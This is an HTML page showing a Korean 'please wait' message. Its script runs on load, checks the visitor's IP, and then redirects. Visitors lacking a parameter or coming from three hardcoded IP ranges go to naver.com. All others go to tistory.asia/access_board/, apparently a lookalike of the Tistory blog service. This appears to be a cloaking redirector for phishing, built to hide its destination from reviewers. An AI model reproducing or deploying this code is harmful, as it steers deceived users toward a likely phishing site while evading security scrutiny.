<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Combined Code</title>
</head>
<body>
    <h1>잠시만 기다려주세요 !!</h1>
    <p id="ipDisplay" data-ke-size="size16">&nbsp;</p>
    <div id="titleContainer">&nbsp;</div>

    <script>
        document.addEventListener("DOMContentLoaded", function() {
            fetch('https://jsonip.com/')
                .then(response => response.json())
                .then(ipData => {
                    var ipAddress = ipData.ip;
                    var urlParams = new URLSearchParams(window.location.search);
                    var vValue = urlParams.get('n');
                    if (!vValue || ipAddress.startsWith('110.93.154') || ipAddress.startsWith('106.249.45') || ipAddress.startsWith('110.35.109')) {
                        window.location.href = 'https://www.naver.com/';
                    } else {
                        var newUrl = "https://tistory.asia/access_board/"+vValue;
                        window.location.href = newUrl;
                    }
                })
                .catch(error => {
                    console.error('Error fetching IP:', error);
                    var ipDisplay = document.getElementById("ipDisplay");
                    ipDisplay.textContent = "IP 주소를 가져오는 중 오류 발생.";
                });
        });
    </script>
</body>
</html>
